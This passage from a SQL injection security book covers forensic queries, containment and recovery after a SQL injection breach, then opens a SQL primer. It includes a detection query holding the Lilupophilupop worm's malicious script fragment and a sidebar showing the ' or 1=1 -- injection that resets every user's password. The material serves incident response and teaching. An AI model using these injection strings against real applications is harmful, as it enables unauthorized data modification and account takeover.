it was created or modified during the timeline of an attack \n(see Figure 10.4).  \n \nFigure 10.4  Sample Query Results Containing Microsoft SQL Server Object Timestamps  \nOracle \nThe following query can be used within Oracle to return a listing of database objects types such as tables, views, and procedures within the current database ordered by modification and creation date both in descending order:  \nSelect object_name, object_id, object_type, created, last_DDL_time from dba_objects ORDER BY \nLAST_DDL_time DESC, created DESC;  \nSample query results are shown in Figure 10.5.  \n\n \nFigure 10.5  Sample Query Results Containing Oracle Object Timestamps  \nMySQL  \nWhen working with MySQL it should be noted that timestamps aren’t stored for some objects \nsuch as triggers and views. When the following query is run obje cts not associated with \ntimestamps will be returned as NULL:  \nselect ∗ from \n( \n(SELECT TABLE_NAME as “OBJECT”, TABLE_SCHEMA as “OBJECT_SCHEMA”, TABLE_TYPE as \n“OBJECT_TYPE”, CREATE_TIME, UPDATE_TIME from information_schema.tables)  \nUNION  \n(SELECT SPECIFIC_NAME,  ROUTINE_SCHEMA, ROUTINE_TYPE, CREATED, LAST_ALTERED FROM \ninformation_schema.routines WHERE ROUTINE_TYPE = ‘PROCEDURE’)  \n\nUNION  \n(SELECT User, ’’, ‘DB_USER’, ’’, ’’ from mysql.user)  \n)R \nSample results are shown in Figure 10.6.  \n \nFigure 10.6  Sample Query Results Containing MySQL Object Timestamps  \nDue to the fact some obje cts aren’t associated with timestamps it is recommend you also \nreview the results for entries that don’t following the server’s naming convention. \nPostgreSQL  \nPostgreSQL does not record timestamp information for created objects, tables, users, etc.  \nHowever the following query can be run to return the name, schema, and type of key objects \nwithin the current database. You can review the names for irregular object names, which \nshould be treated as suspect and qualified by a system database administrator : \nselect proname as “OBJECT_NAME”, ’’ as “OBJECT_SCHEMA”, ‘PROCEDURE’ as “OBJECT_TYPE” from \npg_proc UNION ALL select tgname, ’’, ‘TRIGGER’ from pg_trigger  \nUNION ALL select tablename, schemaname, ‘TABLE’ from pg_tables UNION ALL select usename, ’’, \n‘USER’ from pg_user  \nSample results are shown in Figure 10.7.  \n\n \nFigure 10.7  Sample Query Results Containing a PostgreSQL Database Object Listing  \nThis concludes our review of some key artifacts that hold evidence needed to confirm or \ndiscount the occurrence of a successful SQL injection attack. It is my hope that you have \ndiscounte d a suspected attack, however in the event you have found evidence to the contrary \nwe’ll take a look at the critical actions you must perform to effectively contain and recover from a SQL injection attack.  \nSo, you’re a victim —now what?  \nThere is an age- old saying “be careful what you look for you just might find it”. A security \nincident definitely falls in line with this adage. Security incidents are stressful as you try and piece together what happened and who is at fault for the compromise. They can also b e \nexciting as you solve the question of “who has done it” and “how did they do it”? As much as you may want jump right into the exciting areas of an incident it is imperative that an orderly and well -structured process is followed from beginning to end to ensure minimal impact to an \norganization. \nMost organizations today have computer emergency response processes already defined or, \ndepending on the nature of information involved in the incident, standards such as the Payment Card Industry (PCI) Data Securi ty Standard (DSS) may govern the steps you are required to \nperform to manage and contain an incident. The processes we are about to cover will provide specific steps to follow during the management of a security incident, however these steps are not intended to replace your organizational incident response processes, or mandated \n\nregulatory requirements, alternatively, they should be used as a guideline that can be applied in \nsupport of your required incident response processes. \nThe first step in recovering from a SQL injection attack is to effectively “stop the bleeding” \nand contain the incident.  \nContaining the Incident  \nWhen managing a SQL injection incident it is imperative to achieve efficient and effective containment. The longer a SQL injection vulnerabi lity remains exposed the greater the \npossibility of additional records being compromised or an attacker increasing his foothold into an environment. This all boils down to the quicker you can contain an incident, the smaller the impact is to an organizatio n. The objective of containing an incident that has not yet been fully \nscoped may seem incredibly difficult, however it is necessary and not impossible. When dealing with an incident  containment steps need to be planned with the details you have. It is \nbetter to stop the bleeding at the onset and then, if need be, revisit your containment measures \nwhen you conclude your full investigation.  \nTo contain a SQL injection incident you can simply unplug the network cable from \ncompromised servers. Although a SQL injection attack directly targets the database server, depending on an attacker’s actions and network- based controls (such as firewall rules on \ndatabase traffic) they may have been able to export database data to another connected server for external transfe r. In this scenario it could still be downloaded by the attacker if just the \ndatabase server is removed from the network. It’s better to remove both database and associated web servers from the network by unplugging their network cables. It is imperative that you do not unplug the power cables from the systems or stop and restart the web or \ndatabase services as this will force the purging of volatile data which can be critical in a full forensic investigation. You should also ensure to record which network cable was unplugged \nfrom which system at what time. After the incident is contained you can move on to determining the data involved which will drive future steps in the management of the incident.  \nAssessing the Data Involved  \nDatabases can hold a variety o f information. Some of this database content can be simple \npublic information, but other content can include sensitive data ranging from personal information that can be used for social engineering attacks, to financial and health information that can be u sed for fraud. Unfortunately it doesn’t stop there. There are other types of \ninformation that carry an even higher risk—loss of human life. For example if a list of \nidentities and locations of undercover agents or citizens on the Witness Protection program  \nwas disclosed this could greatly threaten their personal safety.  \nDetermining the type of data involved in an incident will allow your organization to \ndetermine the steps required to manage it. Some of these steps may include meeting applicable \nregulatory and legislative requirements that will affect how you manage the incident and who \nyou notify about it.  \nYou should be sure to review the nature of data stored, processed, or transmitted by \ncompromised systems:  \n• The type of information involved. \n• If the in formation is identifiable to an individual or organization. \n• Country and state or province of affected individuals. • What action was performed on the data (updated, deleted, corrupted, disclosed).  \n• Impact of unauthorized data reuse.  \n• Any mitigating con trols such as data encryption that would lower the likelihood of the \ninformation being reused by unauthorized individuals. \nThe previous points will help you pinpoint the criticality of the information, which will help \ndetermine required actions including who you need to notify about the incident. \nNotifying the Appropriate Individuals  \nMany states and provinces around the world have rules that require organizations entrusted \nwith managing personal information to notify individuals affected by a data security breach. Specific requirements vary from state to state and province to province and are dependent on where the affected ind ividual resides.  \nIn addition, contractual requirements with clients and regulations such as PCI DSS, which \nmandate disclosure of breaches affecting credit card information, can impose further notification requirements in the event of a breach.  \nAs you can s ee figuring out who should be notified is a difficult task that may include \nreviewing legally binding contracts, statutes, and regulations. \nThis task is one best left with the victim organization’s senior management and legal \ncounsel. They will make the business decision as to what requirements apply, the notification \nthat needs to be sent, the messaging, and who is best equipped to manage it. \nThis approach also frees incident handlers and forensics professionals to focus on the \ntechnological aspects of the  incident such as determining the actions performed by the attacker \nduring the incident. \nDetermining What Actions the Attacker Performed on the System  \nEarlier when confirming a SQL injection attack we looked at some key artifacts to identify malicious statements and queries that were successfully executed by the database server. This allowed us to conclude if there was a successful attack, however it is not sufficient to just know that an attack has occurred— you should also determine the scope of the breach. \nKnowing the executed query or statement is a start but knowing the specific records that would have been disclosed or modified allows you to narrowly scope the incident. When considering the notification requirements we just reviewed, being able to discount the disclosure of credit card details or individual’s personal information can reduce the overall cost of recovery as well as total impact experienced by the victim organization. This feat is best managed by executing a database forensics investigation . \nDatabase forensics focuses directly on the identification, preservation, and analysis of \nevidence that can scientifically prove an incident has occurred and to properly scope it by:  \n• Identifying the information viewed by the attacker.  \n• Identifying the DML and DDL operations performed by the attacker and the specific records \naffected.  \n• Identifying the state of affected data records pre-  and post -transaction to support recovery.  \n• Recovering previously deleted database data.  \nDatabase forensics is a very specialized discipline involving low level operations such as \nanalyzing specific data pages used to store database table data and reverse engineering \ninformation from the transaction log. This is out of scope for this book however the references listed in Table 10.5 can be used for additional database forensics related information and tools. \nTools and traps  \nIn 2009 a leading Anti -Virus company was the target of a SQL injection attack. The attacker had made claims that \nhe exploited a SQL injection vulnerability within the vendor’s website and stolen sensitive information about the \nvendor’s customers. The vendor sought the expertise of a database forensics expert who was able to confirm the \nattacker did successfully compr omise the website via a SQL injection vulnerability however the attacker did not \naccess the data claimed. This investigation was able to successfully scope the incident and by doing this reduced \nthe recovery cost and overall impact to business. Further det ails can be read on the vendor website.i \nTable 10.5  Database Forensics Resources  \n \nWith an understanding of the benefit of a database forensics investigation to properly scope \na breach we will move on to the actions required to effectively recove r from one.  \nRecovering from a SQL Injection Attack  \nIn previous chapters we reviewed multiple SQL injection exploitation techniques such as \nTime -based and Error -based injections, automated injection tools, worms, and payloads such \nas stealing information or  escaping form the database and running  OS level commands. There \nare a multitude of combinations that can be used in an attack and these combinations will ultimately determine how you recover from the attack. The first step in recovery is determining what type of payload was delivered by the successful attack:  \nStatic payload:  The actions performed post -compromise are consistent from compromised \nsystem to compromised system. Static payloads are commonly associated with SQL injection \n\nworms and scripts that ar e not polymorphic in nature. They will repeat the same actions each \ntime they identify and exploit a SQL injection vulnerability.  \nDynamic payload:  The actions performed post -compromise are not likely to be consistent \nfrom compromised system to compromised system. An example of this would be an attacker \nwho exploits a SQL injection vulnerability using an exploitation tool. Once the attacker gains access he will enumerate the database and depending on the database server version, enabled features, and the privileges he currently has he can execute any number of actions within the RDBMS. Even if the attacker used the same tool to compromise multiple serv ers the actions he \nperforms are highly likely to be different between compromised systems depending on his privileges, the database server configuration, and information he is after.  \nWith the two types of payloads an attack can yield outlined we will now l ook at how you \ncan determine what payload an attack carried.  \nDetermining the Payload of an Attack  \nThe steps needed to determine the payload of an attack may affect volatile database evidence. If you are proceeding with a database forensics investigation there are several database artifacts outside of what we have reviewed in this chapter that should be preserved prior to continuing. You can refer to section “Determining what actions the attacker performed on the \nsystem” within this chapter for additional gu idance.  \nThe following steps can be executed to identify the payload of a successful attack:  \n1. Backup the victim database:  Make two copies of the victim database. One will be \nrecovered and the other will serve as a clean recovery point in event of recovery  issue.  \n2. Extract malicious SQL injection queries:  Create a single list of unique malicious queries \nand statements extracted from web server logs, database execution plans, and statement and binary logs for compromises involving MySQL and PostgreSQL database servers.  \n3. Comprehend malicious query logic:  Review the malicious query and statement listing and \ndetermine the objects created, accessed, updated, or deleted and how the attacker accomplished this. You will need this to determine the scope of the inc ident and later to plan \nrequired incident recovery steps. Note that some malicious queries may have been obfuscated to avoid detection and you will need to convert them into human readable form. For additional details on this refer to the “Evading Input Fi lters” section in Chapter 7 . \n4. Search for references to the malicious queries:  You may have a listing of known \nmalicious statements and commands that you can use to cross -reference against your list of \nmalicious queri es to identify their source. If you do not have a list of known bad queries you \ncan use your Internet search engine of choice to search for references to the previously \nidentified malicious queries. As rudimentary as it sounds when you identify a successful SQL injection attack, odds are there are other customers who have fallen victim to it or write -ups from security companies and researchers on the attack that you can leverage.  \n5. Determine if the malicious queries identified are part of a static or dynam ic payload:  \nFrom your search results determine if the attack activity is associated with static payloads such as SQL injection worms or dynamic payloads traditionally delivered ad- hoc by an \nattacker using an SQL injection exploitation tool.  \n6. Look for mul tiple exploitations:  It’s important that you check all entries in your malicious \nquery list as it’s possible the same SQL injection vulnerability was exploited multiple times using both static and dynamic payloads. Identification of any single dynamic payl oad should \nbe the high -water mark regardless of how many static payloads you may detect.  \nAfter completion of the preceding steps you should be able to conclude if the SQL injection \nattack carried a dynamic or static payload. This conclusion will determine the recovery actions you will need to perform. In the following section we will walk through recovery of attacks carrying static payloads as well as those with dynamic payloads. In event of an actual incident you should pick and follow only the appropriate  one, static or dynamic recovery.  \nRecovering from Attacks Carrying Static Payloads  \nAttacks with static payloads have a relatively straight forward recovery process as the malicious actions performed by the worm or other threat is known. The core focus is r olling \nback the database to before the infection, or identifying and undoing the specific operations performed by the execution of the malicious queries and statements. The following steps will walk you through static payload recovery:  \n1. Restore database state: Restore affected databases to a known good state using one of the \nfollowing methods:  \na. Restoring from backup:  Using the attack timeline identified during artifact analysis you \ncan restore affected databases to known state immediately before the com promise. It \nshould be noted that this may result in the loss of transactions that occurred from your \nknown good state up until the time of incident containment. \nb. Identify transactions to be rolled back:  Whether manually or by using a log analyzer \nsuch as  Logminer for Oracle, identify the transactions associated with the attack payload \nto be rolled back. The Lilupophilupop worm is an example of a worm that delivers a static payload which searches  tables for columns suitable to hold malicious code that it w ill \nultimately write to them. The following is an example of a query that searches the Microsoft SQL Server transaction log for transactions carrying the payload delivered by the Lilupophilupop worm:  \nselect [transaction id] as ‘transaction_id’, [operation] , [allocunitname] as ‘table’, \n[page id] as ‘page’, [Slot ID] as ‘record_id’, [offset in Row] as ‘record_offset’ from \nfn_dblog(null,null) where CONVERT(varchar(max), [rowlog contents 1]) like ‘%</title><script src=“http://lilupophilupop.com/sl.php”%’ and [Operation] = ‘LOP_MODIFY_ROW’ or CONVERT (varchar(max), [rowlog contents 0]) like ‘%</title><script src=“http://lilupophilupop.com/sl.php”%’ and [Operation] = ‘LOP_INSERT_ROWS’ or CONVERT (varchar(max), [rowlog contents 4]) like ‘%</title><script src=“http: //lilupophilupop.com/sl.php”%’ and [Operation] = ‘LOP_MODIFY_COLUMNS’\n \nThe preceding query converts the hex -based transaction log values into character format \nand compares it to a fragment of the worm payload. The following results show the \ntransactions executed by the worm to write its payload to database tables. Sample results are as follows (see Figure 10.8):  \nThe preceding information can be used to identify the transactions that need to be reversed. You can manually  create undo scripts for the transaction or use log reader tools \nsuch as ApexSQL for Microsoft SQL Server and other RDBMS products or Logminer which is a free tool released by Oracle to rollback Oracle transactions. The following is a screen capture of transaction browsing using Oracle Logminer (see Figure 10.9):  \nWithin the preceding image pressing the “Flashback Transaction” button will roll back the transaction seamlessly in Oracle 11g and higher. More information ca n be obtained \nfrom the OracleFlash website .\nii \n \nFigure 10.8  Sample Query Results Containing Microsoft SQL Server Transactions Executed by the \nLilupophilupop Worm  \n \nFigure 10.9  Screen Capture of Transaction Browsing Using Oracle Logminer  \n2. Verify database server configuration:  If the static payload included enabling frequently \ntargeted RDBMS features or loosening the configuration of the server to further the attack \nyou should restore the database server configuration to a known good state. Regardless if you restored a victim database from backup or manually rolled back transactions, any server wide configuration settings changed during the attack will remain until you explicitly identify and reverse them. You should audit server configuration settings and ensure they are in line with the intended configuration. \n3. Identify and fix the SQL injection vulnerability:  Ensure an application security \nassessment of the entire code base is performed to identify the exploited vulnerability as well as o ther instances that may exist.  \n\n4. Bring the system back on -line and restore web services.  \nRecovering from Attacks Carrying Dynamic Payloads  \nAttacks carrying dynamic payloads are the most difficult to recover from because the actions \nof the attacker can vary greatly with each compromise. If a SQL injection attack was launched over HTTP POST requests, most webservers are not configured to log this activity. Further if there has been a large amount of time between compromise and the investigation, execution plans and other evidence may have been overwritten. Another complexity is that an attacker may escape the database into the operating system, establish an out -of-band connection \ndirectly to the compromised server and bypass the database altogether as he continues to exploit. In cases of successful attacks carrying dynamic payloads it is highly recommend that you engage  a database forensics exper t to perform the investigation. There are good sources to \nlearn database forensics available online, however there is no substitute for experience. An expert has a far greater chance of narrowly scoping and recovering from an incident. That being said the following steps can be followed:  \n1. Restore database state:  The recommend approach to recover from SQL injection attacks \nwith dynamic payloads is to restore both the RDBMS and the operating system to its state \nprior to the compromise. It should be noted that this may result in the loss of transactions that occurred from your known good state up until the time of incident containment. You may elect to not proceed with the recommended approach of restoring the database and operating system. In these instances  you can follow the restoring database state process \ncaptured under the Static payload recovery section. However, be forewarned that depending on the lapse of time between the attack and investigation artifacts may have been partially overwritten and may n ot accurately capture all actions and activities performed by an \nattacker on the system. Due to this, static payload recovery steps may not fully restore the server to a clean state and attackers may still maintain control over your server and/or networked devices post -recovery. Use extreme caution and act at your own risk. \n2. Identify escaped database activity:  Within the listing of malicious queries you earlier \ngenerated you should identify statements that allowed the attacker to escape from the database server to the underlying operating system file system or registry. If operating \nsystem activity is identified you should perform the following:  \na. Look for the creation of any out -of-band communication methods such as creating \noperating system user account s that could have been used for the attacker to further the \nattack outside of the database.  \nb. Look for references to files within the operating system or registry keys that were read, \ncreated or loaded into the database by the attacker. Ensure to forensic ally preserve the \nfiles and or registry keys and then review a copy to gain an understanding of what the attacker did. This analysis may be able to identify other out -of-band connection methods \nsuch as uploading a malicious file to a table via a SQL injection vulnerability and then exporting it and rebuilding it on the victim.  \nc. Review network logs to identify communication from the database server to other \nnetworked machines. If suspicious activity is observed you should investigate associated hosts as we ll for compromise.  \n3. Verify database server configuration:  Once an attacker gains access to database server he \nwill likely loosen security if present to further his foothold on the server. Restoring a victim database to a known good state may not eliminat e back doors an attacker may have created \nsuch as a RDBMS login. An audit should be performed on the server to ensure existing \nserver settings remain in their expected state.  \n4. Identify and fix the SQL injection vulnerability:  Ensure an application securi ty \nassessment of the entire code base is performed to identify the exploited vulnerability as well as other instances that may exist.  \n5. Bring the system back on -line and restore web services.  \nSummary  \nDefense is defined by dictionary.com as “the resistance against danger, attack, or harm.” \nTraditional SQL injection defenses such as secure coding practices, web application firewalls, and vulnerability assessment programs are effective measures that will reduce the likelihood of an organization experiencing a  SQL injection -related breach. With the cat and mouse nature of \ninformation security, security professionals will continue to defend against attacks however hackers will continue to adapt and attack in an effort to circumvent defenses. This cycle will continue and it is inevitable that organizations with web -based applications will be faced with \ninvestigating SQL injection attacks.  \nKeeping this in mind as we revisit our defense definition, danger, attack, or harm can also \nfall upon an organization that cannot efficiently respond to and discount a suspected SQL \ninjection attack or narrowly scope and recover from a successful attack to minimize impact to business. \nYou can create a holistic SQL injection defense strategy by using the investigation, \ncontainment, and recovery practices outlined in this chapter to augment traditional defense \nmeasures. Only with this holistic strategy can you protect an organization by defending it before, during, and after a SQL injection attack.  \nSolutions fast track  \nInvestigating a Suspected SQL Injection Attack:  \n• Investigations should only be performed by computer security incident responders and \nforensics professional authorized to perform investigations within an organization.  \nRequired Forensically Sound Practices:  \n• A true bit -for-bit copy should be made on all files gathered during an investigation. \n• A hash should be generated on each copied file and compared against a hash of the original \nto verify the integrity of the bit -for-bit copy.  \n• Document all actions performed during your investigation including all queries executed \nagainst an RDBMS and the returned results.  \n• Ensure all gathered files are written to sterile storage media and stored in a secure location.  \n• Maintain chain of custody for all collected evidence.  \nAnalyzi ng digital artifacts:  \n• Digital artifacts are collections of related data.  \n• Artifacts most beneficial in a SQL injection attack investigation are Web server log files, \ndatabase execution plans, the transaction log and database object timestamps.  \nIdentifying SQL injection attack activity:  \n• Perform a broad analysis of web server log files looking for dates with abnormally high \nnumber of web requests or bandwidth usage between the web server and client computers.  \n• Review database execution plans an d associated logs for malicious queries.  \n• Review transaction logs for suspicious activity that occurred during the timeframe of an \nattack paying close attention to executed INSERT, UPDATE, and DELETE statements.  \n• Database object timestamps should be revi ewed to identify user account creation, privilege \nescalation, and the creation of tables.  \nConfirming if a SQL injection attack was successful:  \n• The following discoveries confirm a successful SQL injection attack:  \n• SQL injection activity captured within d atabase execution plans or associated database \nlogging.  \n• Unauthorized transactions, object creation, or modifications. \nContaining the Incident:  \n• Unplug the network cable from compromised database and associated web servers.  \nAssessing the Data Involved:  \n• Data must be assessed to ensure your organization can determine applicable regulatory and \nlegislative requirements.  \nNotifying the Appropriate Individuals:  \n• Notification of a breach should be managed by the victim organization’s senior management \nand lega l counsel.  \nDetermining the Actions the Attacker Took on a System:  \n• Database forensics can be used to determine the specific actions performed by the attacker \nduring the attack.  \nDetermining the attack payload:  \n• Backup the victim databases.  \n• Extract malic ious SQL injection queries.  \n• Review and comprehend malicious query logic to gain an understanding of what the payload \nis attempting to accomplish.  \n• Search for references to the malicious queries.  \n• Determine if the identified malicious queries are part o f a static or dynamic attack payload.  \n• Look for multiple exploitations.  \n• Attacks should be classified as carrying either a static or dynamic payload.  \n• The attack payload will determine how the incident is recovered.  \nRecovering from a SQL Injection Attack:  \n• Restore the database to a known good state.  \n• Verify database server configuration.  \n• Identify and fix the SQL injection vulnerability.  \n• Bring the system back on- line and restore web services.  \nFrequently Asked Que stions  \nQ: What happens if someone who isn’t forensically trained or authorized to conduct an \ninvestigation performs one?  \nA: Any unauthorized individual who performs an investigation, whether they are forensically \ntrained or not, can be faced with legal rep ercussions. Further they may invalidate evidence, and \ndiscoveries that result from this evidence may not be admissible in a court of law or be \naccepted for use within formal proceedings within a corporation. \nQ: What is a polymorphic SQL injection worm?  \nA: A polymorphic SQL injection worm is one that mutates and changes as it infects. These \nworms are specifically designed to dynamically change to avoid signature- based detection \nmechanisms. At the time of this writing there are no known polymorphic SQL inject ion \nworms, however they are expected to surface within the near future.  \nQ: Do I have to use the database clients referenced in this book to perform an investigation?  \nA: No, you can use any trusted database client obtained from a reliable source as long as it can \nlog its actions while it connects to, and queries an RDMS. Further, the client will need to have \nthe ability to redirect stdout to a file to preserve the results of your queries.  \nQ: Can I use the RDBMS query editor to conduct an investigation instea d of using a database \nclient?  \nA: It is not recommended to use an application running on a victim system to conduct an \ninvestigation. RDMBS and or operating system files may have been tampered with during an attack which can result in skewed results to your  queries. You should use a trusted client \nrunning on a trusted computer to connect to and perform an investigation on a victim database server.  \nQ: Will the same queries work against different RDBMS products?  \nA: No, most popular RDBMS products support a bas e level of SQL, however each have their \nown unique statements and functions. Basic queries may work across multiple RDBMS \nplatforms however the queries required to gather database artifacts require specific database views and functions that are not common across platforms.  \nihttp://www.kaspersky.com/about/news/press/2009/Kaspersky_Lab_Confirms_Website_Attack_Verifies_No_Data_Was_Comp\nromised  \niihttp://oracleflash.com/28/Oracle- 11g-Using-LogMiner- to-analyze-redo-log-files.html  \n \n \n \n \nChapter 11  \nReferences  \nGary O’leary -Steele  \nSolutions in this chapter:  \n• Structured Query Language (SQL) Primer  \n• SQL Injection Quick Reference  \n• Bypassing Input Validation Filters  \n• Troubleshooting SQL Injection Attacks  \n• SQL Injection on Other Platforms  \n• Resources  \nIntroduction  \nThis chapter contains a number of topics that should be useful reference items for \nunderstanding SQL injection. These ran ge from a simple introduction to the basic Structured \nQuery Language (SQL) itself, to helping you understand how SQL works under normal circumstances, therefore helping you to rewrite SQL statements in a way that continues to be syntactically correct.  \nAddi tionally, the chapter provides a series of SQL injection cheat sheets for quickly jumping \nto the material you’re interested in, perhaps just to remind you how SQL injection works or what the syntax is. I have also provided a table of troubleshooting tips w hich will assist you in \novercoming the most commonly encountered problems when exploiting SQL injection vulnerabilities. Finally, you’ll find some information about databases not discussed in this book—we’ve used Microsoft SQL Server, Oracle, PostgreSQL, a nd MySQL in our examples \nso far, largely due to their widespread adoption in the real world. Check out “SQL Injection on Other Platforms” for information about exploiting SQL injection on platforms other than those outlined above.  \nStructured query language  (SQL) primer  \nSQL was originally developed at IBM in the early 1970s but was not officially formalized until \n1986 by the American National Standards Institute (ANSI). SQL was initially designed as a data query and manipulation language with limited functionality when compared to today’s feature- rich SQL dialects. In this section, I’ll provide a brief overview of the common SQL \nqueries, operators, and features. If you are already familiar with SQL, you can skip this section.  \nEach major database vendor has ex tended the SQL standard to introduce features specific to \ntheir own product. For our purposes, we will use the SQL standard defined by the International Organization for Standardization (ISO) since this will be valid for most database platforms. Where necessary I will highlight platform- specific variations to the standard. \nSQL Queries  \nSQL queries are made up of one or more SQL statements that are effectively instructions for the database server to carry out. The most common SQL statements you will encounter  when \nworking with a database or performing SQL injection are SELECT , INSERT , UPDATE , \nCREATE, UNION SELECT , and DELETE.  \nSQL queries that are designed to read, delete, or update table data will often include a \nconditional clause to target specific rows in a  table. A conditional clause begins with WHERE \nfollowed by the condition. The OR  and AND  operators are used when multiple conditions are \nto be evaluated.  \nFor the purposes of this tutorial, each example query is aimed at the tblUsers table unless \notherwise specified. Table 11.1 outlines the structure of the tblUsers table.  \nTable 11.1  Example SQL Table, tblUsers  \n \nSELECT Statement  \n\nThe primary role of the SELECT  statement is to retrieve data from a database and return it  to \nthe application or user. As a basic example, the following SQL statement will return data from \nevery row and column within the tblUsers table:  \nSELECT ∗ FROM tblUsers  \nThe asterisk ( ∗) character is a wildcard that instructs the database server to return all data. If \nonly specific columns are required, the name of each column is listed in place of the wildcard. \nThe following example will return the username  column for all  rows within tblUsers : \nSELECT username FROM tblUsers  \nTo return specific rows from a table based on conditional criteria, you can add the WHERE  \nclause followed by the desired condition. For example, the following SQL query will return all rows that have a u sername value of \nadmin  and a password value of letmein : \nSELECT ∗ FROM tblUsers WHERE username =‘ admin’ AND password = ‘letmein’  \nMicrosoft SQL Server also allows you to use SELECT  statements to read table data from \none table and insert it into another. In t he following example, all data from the tblUsers  table is \ncopied into the hackerTable  table:  \nSELECT ∗ INTO hackerTable FROM tblusers  \nUNION Operator  \nYou use the UNION  operator to combine the result sets of two or more SELECT  statements. \nAll SELECT  statements within the union must return the same number of columns and their \ndata type must be compatible. In the following example, the SQL query will combine the username  and password columns from the tblUsers and tblAdmins  tables:  \nSELECT username, password FROM tblUsers UNION SELECT username, password FROM  \ntblAdmins  \nUNION SELECT  will automatically compare the values returned by each SELECT  statement \nand return only distinct values. To permit duplicates and prevent the database from comparing the returned  data, use UNION ALL SELECT : \nSELECT username, password FROM tblUsers UNION ALL SELECT username, password  \nFROM tblAdmins  \nINSERT Statement  \nAs you have probably guessed already, you use the INSERT  statement to insert data into a \ntable. You can structure the I NSERT  statement in two different ways to achieve the same goal. \nThe following INSERT  statement will insert the values 5, john, smith , and 0 into the tblUsers  \ntable:  \nINSERT INTO tblUsers VALUES (5,‘john’,‘smith’,0)  \nIn this example, the data to be inserted i nto the table is arranged in the correct order to \ncorrespond with each column in the table. The most significant problem with this approach is \nthat if the table structure is changed (e.g. columns are added or deleted) data could be written \nto the wrong col umn. To avoid potentially harmful  mistakes the INSERT  statement can accept \na comma- separated list of target columns following the table name:  \nINSERT INTO tblUsers(id, username, password, priv) VALUES (5, ‘john’,‘smith’,0)  \nIn this example, each target colum n is listed to ensure that the supplied data is inserted in the \ncorrect column. If the table structure changes, the INSERT  statement will still target the correct \ncolumns. \nUPDATE Statement  \nYou use the UPDATE statement to modify existing data within a datab ase table. The following \nUPDATE  statement will change the priv  column value to 0 for all records that have the \nusername  value of sarah:  \nUPDATE tblUsers SET priv=0 WHERE username = ‘sarah’  \nIt is important to note that all UPDATE  statements should include a WHERE clause to \nindicate which rows should be updated. If you omit the  WHERE clause, all rows are affected. \nDELETE Statement  \nYou use the DELETE statement to delete rows from a table. The following DELETE statement \nwill delete all rows from tblUsers that have a username  value of admin:  \nDELETE FROM tblUsers WHERE username = ‘admin’  \nIt is important to note that all DELETE statements should include a WHERE clause to \nindicate which rows should be deleted. If you omit the  WHERE clause, all rows will be \ndeleted . \nNotes from the underground…  \nDangerous SQL Injection Test Cases  \nOne of the most common methods of detecting a SQL injection vulnerability is to insert a conditional clause and \nobserve the differences in application behavior . For example, injecting the statement OR 1=1 into the WHERE \nclause of a SELECT statement could dramatically change the number of results returned by the query. Consider \nthe following three SQL statements. The first represents the original query, and the s econd and third have been \nmodified via SQL injection.  \nSELECT story FROM news WHERE id=19  \nSELECT story FROM news WHERE id=19 OR 1=1  \nSELECT story FROM news WHERE id=19 OR 1=2  \nWhen executed, the first SQL statement returns the story column from the news table  that has an id value of 19. \nThe second, modified query returns every story in the database, since 1 will always equal 1, and the third query \nreturns the same data as the first query, since 1 does not equal 2.  \nFrom the attacker’s perspective, the vulnerabl e application responds differently to each modified query, and \ntherefore indicates the presence of a SQL injection flaw; so far so good. Unfortunately, this approach can have \ndevastating consequences if the vulnerable query happens to be an UPDATE or DELET E statement.  \nConsider a password reset feature that is vulnerable to SQL injection. Under normal operation, the password \nreset component accepts an e- mail address as its input and executes the following query to reset the user’s \npassword:  \nUPDATE tblUsers S ET password=‘letmein’ WHERE  \nemailaddress=‘someuser@victim.com’  \nNow consider that we have injected the string ‘ or 1=1 -- into the e -mail address field. The SQL statement now \nreads:  \nUPDATE tblUsers SET password=‘letmein’ WHERE emailaddress=’’  \nor 1=1--’ \nThe m odified statement now updates the password field for every record in the table since the effective condition \nis WHERE 1=1.  \nTime to restore from backup! Or as was the case when this actually occurred, time to inform the client and be \nbeaten with a stick.  \nTo prevent this from happening to you, first try to understand the query you are injecting into. Ask yourself: \n“Could this be an UPDATE or DELETE statement?” For example, the password reset and unsubscribe \ncomponents are likely to be manipulating or deleti ng data, and therefore you should proceed with caution.  \nUsing tools such as OWASP Zed Attack Proxy and other automated SQL injection tools can have the same \nconsequences since they often inject statements such as OR 1=1.  \nEnsure that all data is backed up b efore performing an assessment!  \nDROP Statement  \nYou can use the DROP  statement to delete database objects such as tables, views, indexes, and \nin some cases, even the database itself. For example, the following SQL statement will drop \nthe tblUsers table:  \nDROP TABLE tblusers  \nCREATE TABLE Statement  \nYou use the CREATE TABLE statement to create a new table in the current database or \nschema. Column names along with their data type are passed within parentheses following the table name. The following SQL statement will create a new table named shoppinglist  with two \ncolumns, item  and name : \nCREATE TABLE shoppinglist(item int, name varchar(100))  \nOracle allows you to create a table and populate it with data from another table or view:  \nCREATE TABLE shoppinglist as select ∗ from dba_users  \nALTER TABLE Statement  \nYou can use the ALTER TABLE statement to add, delete, or modify a column within an \nexisting table. The following SQL query would add a column named comments  to the tblUsers  \ntable:  \nALTER TABLE tblUsers ADD comments varchar(100)  \nThe following SQL statement will remove the comments  column:  \nALTER TABLE tblUsers DROP COLUMN comments  \nThe following SQL statement will modify the data type of the comments  column from \nvarchar(100)  to varchar(500) : \nALTER TABLE tblUsers ALTER COL UMN comments varchar(500)  \nGROUP BY Statement  \nYou typically would use the GROUP BY  statement when performing an aggregate function \nsuch as SUM  against a column in a table. For example, consider that you would like to perform \na query against the following Orders table ( Table 11.2) to calculate the total cost for customer \nAnthony Anteater.  \nTable 11.2  Orders Table  \n \nThe following statement will automatically group orders received from user Anthony \nAnteater  and then perfor m a SUM  operation against the Cost  column:  \nSELECT customer,SUM(cost) FROM orders WHERE customer = ‘Anthony Anteater’  \nGROUP BY customer  \nORDER BY Clause  \n\nYou use the ORDER BY  clause to sort the results of a SELECT  statement by a specific column; \nit accepts either a column name or a number as a mandatory parameter. It is possible to add the \nkeyword ASC or DESC  to sort the results in an ascending or descending order, respectively. \nThe following SQL statement will sele ct the cost  and product  columns from the orders  table \nand sort the results by the cost  column in descending order:  \nSELECT cost, product FROM orders ORDER BY cost DESC  \nLimiting the Result Set  \nWhen performing SQL injection attacks you will often need to limi t the number of table rows \nreturned by your injected query (e.g. when extracting data via error messages). The syntax for \nselecting a specific row from a table varies among database platforms. Table 11.3 details the \nSQL  syntax for selecting the first and fifth rows from the tblUsers table.  \nTable 11.3  Limiting the Result Set  \nPlatform  Query \nMicrosoft SQL \nServer  Selecting the first row:  \nSELECT TOP 1 ∗  FROM tblUsers  \nSelecting the fifth row:  \nSELECT TOP 1 ∗  FROM (SELECT TOP 5 ∗ FROM tblusers 